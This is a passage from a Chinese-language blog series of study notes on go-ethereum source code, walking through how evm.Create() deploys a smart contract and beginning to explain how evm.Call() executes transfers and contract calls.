<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">   <span class="comment">// Depth check execution. Fail if we&#x27;re trying to execute above the</span></span><br><span class="line"><span class="comment">// limit.</span></span><br><span class="line"><span class="comment">// 执行深度检查，如果超出设定的深度限制  创建失败</span></span><br><span class="line"><span class="keyword">if</span> evm.depth &gt; <span class="type">int</span>(params.CallCreateDepth) &#123;</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">nil</span>, common.Address&#123;&#125;, gas, ErrDepth</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 账户余额不足，创建失败</span></span><br><span class="line"><span class="keyword">if</span> !evm.Context.CanTransfer(evm.StateDB, caller.Address(), value) &#123;</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">nil</span>, common.Address&#123;&#125;, gas, ErrInsufficientBalance</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>第一个 if 判断中的 <code>evm.depth</code> 记录者合约的递归调用次数。<br />
在 solidity 语言中，允许在合约中通过 <code>new</code> 关键字创建新的合约对象，但这种「在合约中创建合约」的递归调用是有限制的，这也是这个 if 判断的意义。</p>
<h2 id="检查2-是否有相同地址的合约">检查2-是否有相同地址的合约</h2>
<p>然后，给交易发送者的账户<code>nonce</code>加1（普通转账时，是在外面加1的，即在<code>TransitionDb</code>中），<br />
接着判断当前要创建的地址在是世界状态中没有合约存在，如果存在直接返回。</p>
<p>需要注意的点：<br />
由于用到了账户的 <code>Nonce</code> 值，所以同一份合约代码，每次创建合约时得到的合约地址都是不一样的（因为合约是通过发送交易创建，而每发送一次交易 <code>Nonce</code> 值都会改变）。</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">nonce := evm.StateDB.GetNonce(caller.Address())</span><br><span class="line"></span><br><span class="line">   <span class="keyword">if</span> nonce+<span class="number">1</span> &lt; nonce &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">nil</span>, common.Address&#123;&#125;, gas, ErrNonceUintOverflow</span><br><span class="line">	&#125;</span><br><span class="line">	evm.StateDB.SetNonce(caller.Address(), nonce+<span class="number">1</span>)</span><br><span class="line">	<span class="comment">// We add this to the access list _before_ taking a snapshot. Even if the creation fails,</span></span><br><span class="line">	<span class="comment">// the access-list change should not be rolled back</span></span><br><span class="line">	<span class="keyword">if</span> evm.chainRules.IsBerlin &#123;</span><br><span class="line">		evm.StateDB.AddAddressToAccessList(address)</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// Ensure there&#x27;s no existing contract already at the designated address</span></span><br><span class="line">	<span class="comment">// 确保指定地址没有已存在的相同合约</span></span><br><span class="line">	contractHash := evm.StateDB.GetCodeHash(address)</span><br><span class="line">	<span class="keyword">if</span> evm.StateDB.GetNonce(address) != <span class="number">0</span> || (contractHash != (common.Hash&#123;&#125;) &amp;&amp; contractHash != emptyCodeHash) &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">nil</span>, common.Address&#123;&#125;, <span class="number">0</span>, ErrContractAddressCollision</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
<h2 id="创建新的合约账户：">创建新的合约账户：</h2>
<p>第三步，如果上面两个检查都没有问题，那么我们就可以创建新的合约账户了。<br />
先用合约地址在状态数据库中创建一个合约账户，然后给合约账户设置<code>nonce</code>为1。</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 先对当前StateDB进行快照</span></span><br><span class="line">snapshot := evm.StateDB.Snapshot()</span><br><span class="line"><span class="comment">// 创建新合约并将合约的nonce设置为1</span></span><br><span class="line">evm.StateDB.CreateAccount(address)</span><br><span class="line"><span class="keyword">if</span> evm.ChainConfig().IsEIP158(evm.BlockNumber) &#123;</span><br><span class="line">    evm.StateDB.SetNonce(address, <span class="number">1</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="给新的合约账户转账：">给新的合约账户转账：</h2>
<p>第四步是进行转账，将我们创建合约交易时的的以太币数值<code>value</code>转入智能合约账户。<br />
转账的过程很简单，就是sender的账户减减（- -），合约账户加加（++）。</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 转账操作</span></span><br><span class="line">evm.Context.Transfer(evm.StateDB, caller.Address(), address, value)</span><br></pre></td></tr></table></figure>
<h2 id="创建合约对象：">创建合约对象：</h2>
<p>第五步是创建合约<code>Contract</code>对象，并执行。</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Initialise a new contract and set the code that is to be used by the EVM.</span></span><br><span class="line"><span class="comment">// The contract is a scoped environment for this execution context only.</span></span><br><span class="line"><span class="comment">// 创建合约</span></span><br><span class="line">contract := NewContract(caller, AccountRef(address), value, gas)</span><br><span class="line"><span class="comment">// 设置合约字节码、包含构造函数部分</span></span><br><span class="line">contract.SetCodeOptionalHash(&amp;address, codeAndHash)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> evm.Config.Debug &#123;</span><br><span class="line">  <span class="keyword">if</span> evm.depth == <span class="number">0</span> &#123;</span><br><span class="line">    evm.Config.Tracer.CaptureStart(evm, caller.Address(), address, <span class="literal">true</span>, codeAndHash.code, gas, value)</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    evm.Config.Tracer.CaptureEnter(typ, caller.Address(), address, codeAndHash.code, gas, value)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">start := time.Now()</span><br></pre></td></tr></table></figure>
<p>使用caller地址 、合约地址、转账额和交易余额传入<code>NewContract()</code>方法。<br />
然后执行<code>contract.SetCodeOptionalHash()</code>，将合约代码<code>code</code>（包含构造函数部分）设置到合约中：</p>
<figure class="highlight go"><figcaption><span>core/vm/contract.go</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="comment">// SetCodeOptionalHash can be used to provide code, but it&#x27;s optional to provide hash.</span></span><br><span class="line"><span class="comment">// In case hash is not provided, the jumpdest analysis will not be saved to the parent context</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(c *Contract)</span></span> SetCodeOptionalHash(addr *common.Address, codeAndHash *codeAndHash) &#123;</span><br><span class="line">	c.Code = codeAndHash.code</span><br><span class="line">	c.CodeHash = codeAndHash.hash</span><br><span class="line">	c.CodeAddr = addr</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="Contract对象">Contract对象:</h3>
<p>看看<code>Contract</code>对象的数据结构:</p>
<p>一个 Contract 对象包含和维护了合约在执行过程中的必要信息，比如</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>合约创建者</p>
</li>
<li class="lvl-2">
<p>合约自身地址</p>
</li>
<li class="lvl-2">
<p>合约剩余 gas</p>
</li>
<li class="lvl-2">
<p>合约代码</p>
</li>
<li class="lvl-2">
<p>代码的 jumpdests 记录</p>
</li>
</ul>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Contract represents an ethereum contract in the state database. It contains</span></span><br><span class="line"><span class="comment">// the contract code, calling arguments. Contract implements ContractRef</span></span><br><span class="line"><span class="comment">// 数据库中的以太坊智能合约，包括合约代码和调用参数</span></span><br><span class="line"><span class="keyword">type</span> Contract <span class="keyword">struct</span> &#123;</span><br><span class="line">	<span class="comment">// CallerAddress is the result of the caller which initialised this</span></span><br><span class="line">	<span class="comment">// contract. However when the &quot;call method&quot; is delegated this value</span></span><br><span class="line">	<span class="comment">// needs to be initialised to that of the caller&#x27;s caller.</span></span><br><span class="line">	<span class="comment">// CallerAddress是初始化这个合约的人。 如果是delegate，这个值被设置为调用者的调用者。</span></span><br><span class="line">	CallerAddress common.Address</span><br><span class="line">	caller        ContractRef</span><br><span class="line">	self          ContractRef</span><br><span class="line"></span><br><span class="line">	<span class="comment">// JUMPDEST指令分析的结果</span></span><br><span class="line">	jumpdests <span class="keyword">map</span>[common.Hash]bitvec <span class="comment">// Aggregated result of JUMPDEST analysis.</span></span><br><span class="line">	analysis  bitvec                 <span class="comment">// Locally cached result of JUMPDEST analysis</span></span><br><span class="line">	</span><br><span class="line">	Code     []<span class="type">byte</span>  				<span class="comment">// 合约代码</span></span><br><span class="line">	CodeHash common.Hash 			<span class="comment">//代码的HASH</span></span><br><span class="line">	CodeAddr *common.Address 		<span class="comment">//代码地址 // 合约地址</span></span><br><span class="line">	Input    []<span class="type">byte</span> 				<span class="comment">// 入参</span></span><br><span class="line"></span><br><span class="line">	Gas   <span class="type">uint64</span> 					<span class="comment">// 合约还有多少Gas</span></span><br><span class="line">	value *big.Int</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="解释器执行合约初始化代码">解释器执行合约初始化代码:</h2>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 执行合约的初始化</span></span><br><span class="line">ret, err := evm.interpreter.Run(contract, <span class="literal">nil</span>, <span class="literal">false</span>)</span><br></pre></td></tr></table></figure>
<p><code>run()</code>函数将<code>contract</code>交给了evm解释器，返回<code>interpreter.Run（contract, input, readOnly）</code>的执行结果。<br />
此时合约对象中存储的字节码是Deployment Bytecode(部署字节码)，包含了:</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>用户实际交易调用这个新合约时需要执行的字节码(即运行时字节码)</p>
</li>
<li class="lvl-2">
<p>合约的构造函数中进行初始化处理的代码</p>
</li>
</ul>
<p>至于<code>interpreter</code>如何执行合约，另post文分析。</p>
<figure class="highlight go"><figcaption><span>core/vm/interpreter.go</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="comment">// 执行合约代码</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(in *EVMInterpreter)</span></span> Run(contract *Contract, input []<span class="type">byte</span>, readOnly <span class="type">bool</span>) (ret []<span class="type">byte</span>, err <span class="type">error</span>) &#123;</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="StateDB存储合约的运行时字节码">StateDB存储合约的运行时字节码:</h2>
<p>第六步，处理<code>interpreter.Run</code>返回值<br />
<code>interpreter.Run</code>函数的两个返回值分别是<code>ret(运行时字节码)</code>和<code>err</code></p>
<ul class="lvl-0">
<li class="lvl-2">
<p>约定合约代码最大长度为24576，检查代码长度不超过24576</p>
</li>
<li class="lvl-2">
<p>如果执行没有报错：</p>
<ul class="lvl-2">
<li class="lvl-4">计算本次合约创建消耗的gas，每字节200gas, 扣除gas</li>
<li class="lvl-4">在StateDB存储合约的<code>Runtime bytecode</code>运行时字节码,</li>
</ul>
</li>
<li class="lvl-2">
<p>如果报错：</p>
<ul class="lvl-2">
<li class="lvl-4">恢复之前的快照</li>
<li class="lvl-4">如果不是<code>revert</code>指令导致的错误，要扣除所有的gas</li>
</ul>
</li>
</ul>
<p><code>evm.Create()</code>最后返回 合约代码、合约地址、gas余额和错误</p>
<figure class="highlight go"><figcaption><span>core/vm/evm.go</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="comment">// Check whether the max code size has been exceeded, assign err if the case.</span></span><br><span class="line"><span class="comment">// 检查初始化生成的代码长度是否超过限制,约定合约代码最大长度为24576</span></span><br><span class="line"><span class="comment">// 如果执行没有错且代码长度不超过24576</span></span><br><span class="line"><span class="keyword">if</span> err == <span class="literal">nil</span> &amp;&amp; evm.chainRules.IsEIP158 &amp;&amp; <span class="built_in">len</span>(ret) &gt; params.MaxCodeSize &#123;</span><br><span class="line">	err = ErrMaxCodeSizeExceeded</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Reject code starting with 0xEF if EIP-3541 is enabled.</span></span><br><span class="line"><span class="keyword">if</span> err == <span class="literal">nil</span> &amp;&amp; <span class="built_in">len</span>(ret) &gt;= <span class="number">1</span> &amp;&amp; ret[<span class="number">0</span>] == <span class="number">0xEF</span> &amp;&amp; evm.chainRules.IsLondon &#123;</span><br><span class="line">	err = ErrInvalidCode</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// if the contract creation ran successfully and no errors were returned</span></span><br><span class="line"><span class="comment">// calculate the gas required to store the code. If the code could not</span></span><br><span class="line"><span class="comment">// be stored due to not enough gas set an error and let it be handled</span></span><br><span class="line"><span class="comment">// by the error checking condition below.</span></span><br><span class="line"><span class="comment">// 合约创建成功</span></span><br><span class="line"><span class="keyword">if</span> err == <span class="literal">nil</span> &#123;</span><br><span class="line">	<span class="comment">// 计算本次合约创建消耗的gas，每字节200gas</span></span><br><span class="line">	createDataGas := <span class="type">uint64</span>(<span class="built_in">len</span>(ret)) * params.CreateDataGas</span><br><span class="line">	<span class="comment">// 如果交易gas余额足够，则成功部署合约，将合约代码设置到账户储存中</span></span><br><span class="line">	<span class="keyword">if</span> contract.UseGas(createDataGas) &#123;</span><br><span class="line">		evm.StateDB.SetCode(address, ret) <span class="comment">// !!!!!!! 注意点1</span></span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;     <span class="comment">// 否则返回余额不足</span></span><br><span class="line">		<span class="comment">// 当前拥有的Gas不足以存储代码</span></span><br><span class="line">		err = ErrCodeStoreOutOfGas</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// When an error was returned by the EVM or when setting the creation code</span></span><br><span class="line"><span class="comment">// above we revert to the snapshot and consume any gas remaining. Additionally</span></span><br><span class="line"><span class="comment">// when we&#x27;re in homestead this also counts for code storage gas errors.</span></span><br><span class="line"><span class="comment">// 如果代码长度受限或执行错误,合约创建失败，借助上面创建的快照快速回滚</span></span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &amp;&amp; (evm.chainRules.IsHomestead || err != ErrCodeStoreOutOfGas) &#123;</span><br><span class="line">	<span class="comment">// 恢复之前的快照</span></span><br><span class="line">	evm.StateDB.RevertToSnapshot(snapshot)</span><br><span class="line">	<span class="comment">// 如果不是revert指令导致的错误，要扣除所有的gas</span></span><br><span class="line">	<span class="keyword">if</span> err != ErrExecutionReverted &#123;</span><br><span class="line">		contract.UseGas(contract.Gas)</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> evm.Config.Debug &#123;</span><br><span class="line">	<span class="keyword">if</span> evm.depth == <span class="number">0</span> &#123;</span><br><span class="line">		evm.Config.Tracer.CaptureEnd(ret, gas-contract.Gas, time.Since(start), err)</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		evm.Config.Tracer.CaptureExit(ret, gas-contract.Gas, err)</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 最后返回合约代码、合约地址、gas余额和错误</span></span><br><span class="line"><span class="keyword">return</span> ret, address, contract.Gas, err</span><br></pre></td></tr></table></figure>
<h3 id="注意点1：">注意点1：</h3>
<p>为什么存储的合约代码是合约运行后的返回码，而不是原来交易中的数据（即 <code>Transaction.data.Payload</code>，或者说 <code>EVM.Create</code> 方法的 <code>code</code> 参数）?</p>
<p>这是因为合约源代码在编译成二进制数据时，<strong>除了合约原有的代码外，编译器还另外插入了一些代码</strong>，以便执行相关的功能。<br />
对于创建来说，编译器插入了执行合约「构造函数」（即合约对象的 <code>constructor</code> 方法）的代码。<br />
<strong>因此在将编译器编译后的二进制提交以太坊节点创建合约时，EVM 执行这段二进制代码，实际上主要执行了合约的 <code>constructor</code> 方法</strong>，然后将合约的其它字节码返回，所以才会有这里的 <code>ret</code> 变量<strong>作为合约的真正代码存储到状态数据库中</strong>。</p>
<p>也就是说，创建合约交易的初始字节码可分成3个部分:</p>
<ol>
<li class="lvl-3">
<p>Deployment Bytecode(部署字节码) ：</p>
<ul class="lvl-2">
<li class="lvl-6">执行初始化新合约账户的所有操作</li>
<li class="lvl-6">包含 <code>Runtime bytecode</code></li>
<li class="lvl-6">包含 构造函数的字节码</li>
<li class="lvl-6">并不存储在<code>StateDB</code></li>
</ul>
</li>
<li class="lvl-3">
<p>Runtime bytecode(运行时字节码)：</p>
<ul class="lvl-2">
<li class="lvl-6">合约本身的代码</li>
<li class="lvl-6">当新合约被调用时所执行的所有字节码，不包含需要在部署中用来初始化合约的字节码。</li>
<li class="lvl-6">存储在<code>StateDB</code></li>
</ul>
</li>
<li class="lvl-3">
<p>Auxdata</p>
</li>
</ol>
<h3 id="注意点2：">注意点2：</h3>
<p>值得注意的是，如果代码执行错误是<code>revert</code>错误，则不会收取<code>gas</code>，否则<code>gas</code>会被扣除。</p>
<p>那么这个<code>revert</code>是什么？<br />
revert是evm中的一条指令，在我们高级编程语言（solidity）中有<code>require</code>和<code>revert</code>这两个判断。<br />
如果<code>require</code>和<code>revert</code>判断错误，那么就会返回一个<code>revert</code>指令错误，此时就不会收取<code>gas</code>。<br />
这也就是为什么solidity中<code>require</code>和<code>revert</code>执行不会扣除gas的原因。<br />
当然，这个方法是在拜占庭分叉后出现的。</p>
<h1>Summary:</h1>
<p>最后，一张图看看智能合约创建的过程：</p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20220722155925.png" alt="20220722155925" /></p>
<p><code>interpreter.Run()</code>返回的是<code>Runtime bytecode(运行时字节码)</code>：当新合约被调用时所执行的所有字节码，不包含需要在部署中用来初始化合约的字节码。</p>
<h1>Refs:</h1>
<ul class="lvl-0">
<li class="lvl-2">
<p><a href="http://yangzhe.me/2019/08/12/ethereum-evm/#%E5%88%9B%E5%BB%BA%E5%90%88%E7%BA%A6">以太坊源码解析：evm</a></p>
</li>
<li class="lvl-2">
<p><a href="https://blog.csdn.net/lj900911/article/details/84924478">以太坊源码解读（19）通过EVM创建智能合约——Create()</a></p>
</li>
</ul>
]]></content>
      <categories>
        <category>StudyRecord</category>
      </categories>
      <tags>
        <tag>StudyRecord</tag>
        <tag>SmartContract</tag>
        <tag>BlockChain</tag>
      </tags>
  </entry>
  <entry>
    <title>StudyRecord-以太坊源码分析-通过EVM执行转账或合约调用-Call()</title>
    <url>/2022/283.html</url>
    <content><![CDATA[<h1>Pre:</h1>
<blockquote>
<p>在了解合约调用之前，我们需要知道调用合约的本质是什么?</p>
</blockquote>
<p>在我们创建合约的时候，由<code>run</code>函数初始化的智能合约code<code>(Runtime bytecode)(ret)</code>储存在stateDB中。<br />
也就是说在内存中并没有<code>Contract</code>这个对象，而只是存在智能合约<code>code</code>。</p>
<blockquote>
<p>那我们如何调用合约呢？</p>
</blockquote>
<p>本质上，调用合约实际上是</p>
<ol>
<li class="lvl-3">
<p>通过<code>StateDB.GetCode()</code>从合约账户中取出合约代码</p>
</li>
<li class="lvl-3">
<p><code>NewContract()</code>创建出一个临时的<code>contract</code>对象（如下数据结构）</p>
</li>
<li class="lvl-3">
<p>执行<code>contract</code>对象的<code>SetCallCode()</code>或其他方法，确定智能合约的执行环境</p>
</li>
<li class="lvl-3">
<p>执行<code>interpreter.run()</code>函数，返回执行后的代码</p>
</li>
</ol>
<blockquote>
<p>Contract对象的数据结构:</p>
</blockquote>
<p>一个 Contract 对象包含和维护了合约在执行过程中的必要信息，比如<code>合约创建者</code>、<code>合约自身地址</code>、<code>合约剩余 gas</code>、<code>合约代码</code>、<code>代码的 jumpdests 记录</code>。</p>
<figure class="highlight go"><figcaption><span>core/vm/contract.go</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="comment">// Contract represents an ethereum contract in the state database. It contains</span></span><br><span class="line"><span class="comment">// the contract code, calling arguments. Contract implements ContractRef</span></span><br><span class="line"><span class="comment">// 数据库中的以太坊智能合约，包括合约代码和调用参数</span></span><br><span class="line"><span class="keyword">type</span> Contract <span class="keyword">struct</span> &#123;</span><br><span class="line">	<span class="comment">// CallerAddress is the result of the caller which initialised this</span></span><br><span class="line">	<span class="comment">// contract. However when the &quot;call method&quot; is delegated this value</span></span><br><span class="line">	<span class="comment">// needs to be initialised to that of the caller&#x27;s caller.</span></span><br><span class="line">	<span class="comment">// CallerAddress是初始化这个合约的人。 如果是delegate，这个值被设置为调用者的调用者。</span></span><br><span class="line">	CallerAddress common.Address</span><br><span class="line">	caller        ContractRef</span><br><span class="line">	self          ContractRef</span><br><span class="line"></span><br><span class="line">	<span class="comment">// JUMPDEST指令分析的结果</span></span><br><span class="line">	jumpdests <span class="keyword">map</span>[common.Hash]bitvec <span class="comment">// Aggregated result of JUMPDEST analysis.</span></span><br><span class="line">	analysis  bitvec                 <span class="comment">// Locally cached result of JUMPDEST analysis</span></span><br><span class="line">	</span><br><span class="line">	Code     []<span class="type">byte</span>  				<span class="comment">// 合约代码</span></span><br><span class="line">	CodeHash common.Hash 			<span class="comment">//代码的HASH</span></span><br><span class="line">	CodeAddr *common.Address 		<span class="comment">//代码地址 // 合约地址</span></span><br><span class="line">	Input    []<span class="type">byte</span> 				<span class="comment">// 入参</span></span><br><span class="line"></span><br><span class="line">	Gas   <span class="type">uint64</span> 					<span class="comment">// 合约还有多少Gas</span></span><br><span class="line">	value *big.Int</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>知道了这个过程，我们再来看看 智能合约的调用或普通交易——<code>Call()</code>的具体实现。</p>
<h1>evm.Call()的参数:</h1>
<figure class="highlight go"><figcaption><span>core/vm/evm.go</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(evm *EVM)</span></span> Call(caller ContractRef, addr common.Address, input []<span class="type">byte</span>, gas <span class="type">uint64</span>, value *big.Int) (ret []<span class="type">byte</span>, leftOverGas <span class="type">uint64</span>, err <span class="type">error</span>) &#123;&#125;</span><br></pre></td></tr></table></figure>
<ul class="lvl-0">
<li class="lvl-2">
<p><code>caller</code>：转出方地址</p>
</li>
<li class="lvl-2">
<p><code>addr</code>：转入方地址，如果是调用智能合约，那就是智能合约的地址</p>
</li>
<li class="lvl-2">
<p><code>input</code>：调用函数的参数</p>
</li>
<li class="lvl-2">
<p><code>gas</code>：当前交易的剩余gas</p>
</li>
<li class="lvl-2">
<p><code>value</code>：转账额度</p>
</li>
</ul>
<h1>evm.Call()的实现:</h1>
<p><code>evm.Call()</code>的主要功能是执行一笔交易，具体的步骤如下：</p>
<ol>
<li class="lvl-3">
<p>交易执行前的检查：深度判断和余额状况；</p>
</li>
<li class="lvl-3">
<p>判断StateDB是否存在合约地址</p>
</li>
<li class="lvl-3">
<p>进行转账；</p>
</li>
<li class="lvl-3">
<p>创建一个待执行的合约对象，并执行；</p>
</li>
<li class="lvl-3">
<p>处理交易执行的返回值</p>
</li>
</ol>
<h2 id="交易执行前的检查：">交易执行前的检查：</h2>
<p>第一步,执行前检查:判断递归层次和合约调用者是否有足够的交易中约定的以太币。</p>
<figure class="highlight go"><figcaption><span>core/vm/evm.go</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="comment">// Fail if we&#x27;re trying to execute above the call depth limit</span></span><br><span class="line"><span class="comment">// 调用深度检查</span></span><br><span class="line"><span class="keyword">if</span> evm.depth &gt; <span class="type">int</span>(params.CallCreateDepth) &#123;</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">nil</span>, gas, ErrDepth</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// Fail if we&#x27;re trying to transfer more than the available balance</span></span><br><span class="line"><span class="comment">// 余额检查,如果不够直接退出</span></span><br><span class="line"><span class="keyword">if</span> value.Sign() != <span class="number">0</span> &amp;&amp; !evm.Context.CanTransfer(evm.StateDB, caller.Address(), value) &#123;</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">nil</span>, gas, ErrInsufficientBalance</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="判断合约地址是否存在">判断合约地址是否存在:</h2>
<p>第二步，是判断合约地址是否存在；<br />
一般情况下，被调用的合约地址应该存在于<code>以太坊状态数据库</code>中，也就是说合约已经创建成功了。否则就返回失败。<br />
但有一种例外，就是被调用的合约地址是<code>预先定义</code>的情况，此时即使地址不在状态数据库中，也要立即创建一个。</p>
<figure class="highlight go"><figcaption><span>core/vm/evm.go</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="comment">// StateDB是否存在 合约地址</span></span><br><span class="line"><span class="keyword">if</span> !evm.StateDB.Exist(addr) &#123;</span><br><span class="line">	<span class="keyword">if</span> !isPrecompile &amp;&amp; evm.chainRules.IsEIP158 &amp;&amp; value.Sign() == <span class="number">0</span> &#123;</span><br><span class="line">		<span class="comment">// Calling a non existing account, don&#x27;t do anything, but ping the tracer</span></span><br><span class="line">		<span class="keyword">if</span> evm.Config.Debug &#123;</span><br><span class="line">			<span class="keyword">if</span> evm.depth == <span class="number">0</span> &#123;</span><br><span class="line">				evm.Config.Tracer.CaptureStart(evm, caller.Address(), addr, <span class="literal">false</span>, input, gas, value)</span><br><span class="line">				evm.Config.Tracer.CaptureEnd(ret, <span class="number">0</span>, <span class="number">0</span>, <span class="literal">nil</span>)</span><br><span class="line">			&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">				evm.Config.Tracer.CaptureEnter(CALL, caller.Address(), addr, input, gas, value)</span><br><span class="line">				evm.Config.Tracer.CaptureExit(ret, <span class="number">0</span>, <span class="literal">nil</span>)</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">nil</span>, gas, <span class="literal">nil</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// 创建账号</span></span><br><span class="line">	evm.StateDB.CreateAccount(addr)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="转账">转账:</h2>
<p>第三步进行转账。</p>
<figure class="highlight go"><figcaption><span>core/vm/evm.go</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="comment">// 转账</span></span><br><span class="line">evm.Context.Transfer(evm.StateDB, caller.Address(), addr, value)</span><br></pre></td></tr></table></figure>
<h2 id="创建合约对象-并执行">创建合约对象,并执行:</h2>
<p>第四步 使用当前的信息创建一个待执行的合约对象，并执行。<br />
其中 <code>StateDB.GetCode</code> 从状态数据库中获取合约的代码，填充到合约对象中。</p>
<figure class="highlight go"><figcaption><span>core/vm/evm.go</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> isPrecompile &#123;</span><br><span class="line">		ret, gas, err = RunPrecompiledContract(p, input, gas)</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="comment">// Initialise a new contract and set the code that is to be used by the EVM.</span></span><br><span class="line">		<span class="comment">// The contract is a scoped environment for this execution context only.</span></span><br><span class="line">		<span class="comment">// 初始化新合同并设置EVM要使用的代码。</span></span><br><span class="line">		code := evm.StateDB.GetCode(addr)</span><br><span class="line">		<span class="keyword">if</span> <span class="built_in">len</span>(code) == <span class="number">0</span> &#123;</span><br><span class="line">			ret, err = <span class="literal">nil</span>, <span class="literal">nil</span> <span class="comment">// gas is unchanged</span></span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			addrCopy := addr</span><br><span class="line">			<span class="comment">// If the account has no code, we can abort here</span></span><br><span class="line">			<span class="comment">// The depth-check is already done, and precompiles handled above</span></span><br><span class="line">			<span class="comment">// 如果账户没有代码，我们可以在此终止</span></span><br><span class="line">			<span class="comment">// 创建一个待执行的合约对象</span></span><br><span class="line">			contract := NewContract(caller, AccountRef(addrCopy), value, gas)</span><br><span class="line">			contract.SetCallCode(&amp;addrCopy, evm.StateDB.GetCodeHash(addrCopy), code)</span><br><span class="line">			<span class="comment">// 执行</span></span><br><span class="line">			ret, err = evm.interpreter.Run(contract, input, <span class="literal">false</span>)</span><br><span class="line">			gas = contract.Gas</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>这里与<code>create()</code>不同之处:</p>
</blockquote>
<ul class="lvl-0">
<li class="lvl-2">
<p>构建新<code>contract</code>对象的时候，<code>create()</code>调用了<code>SetCodeOptionalHash(&amp;address, codeAndHash)</code>，</p>
</li>
<li class="lvl-2">
<p>而这里<code>Call()</code>调用的是<code>SetCallCode(&amp;addr, evm.StateDB.GetCodeHash(addr), evm.StateDB.GetCode(addr))</code>。</p>
</li>
<li class="lvl-2">
<p><code>create()</code>中构建的contract对象中的Code是来自<code>原始transaction</code>中的<code>Payload</code>，</p>
</li>
<li class="lvl-2">
<p>而在<code>Call()</code>构建的contract对象中的Code则是<code>create()</code>中初始化智能合约即执行<code>run()</code>之后返回的<code>ret</code>，这两者在结构上是有区别的。</p>
</li>
</ul>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20220724114632.png" alt="20220724114632" /></p>
<blockquote>
<p>没看到哪里调用合约代码呀？只不过是使用 <code>StateDB.GetCode</code> 获取合约代码，然后使用 <code>input</code> 中的数据作为参数，调用解释器运行合约代码而已哪里有调用合约 public 方法的影子？</p>
</blockquote>
<p>这里确实与创建合约时类似，没有「调用」的影子。<br />
还记得前面我们介绍合约创建时，提到过<code>合约编译器</code>在编译时，会插入一些代码吗？<br />
在介绍合约创建时，我们只介绍了编译器插入的创建合约的代码，解释器执行这些代码，就可以将合约的真正代码返回。<br />
类似的，<code>编译器</code>还会插入一些调用合约的代码，只要使用正确的参数执行这些代码，就可以「调用」到我们想调用的合约的 public 方法。</p>
<p>想要了解这整个机制，我们需要先介绍一下「函数选择器」这个概念。</p>
<blockquote>
<p>什么是「函数选择器」?</p>
</blockquote>
<p>简单来说，就是合约的 public 方法的声明字符串的 Keccak-256 哈希的前 4 个字节。<br />
「函数选择器」告诉了以太坊虚拟机我们想要调用合约的哪个方法，它和参数数据一起，被编码到了交易的 <code>data</code> 数据中。</p>
<blockquote>
<p>但我们刚才通过对合约调用的分析，并没有发现有涉及到解析「函数选择器」的地方呀？</p>
</blockquote>
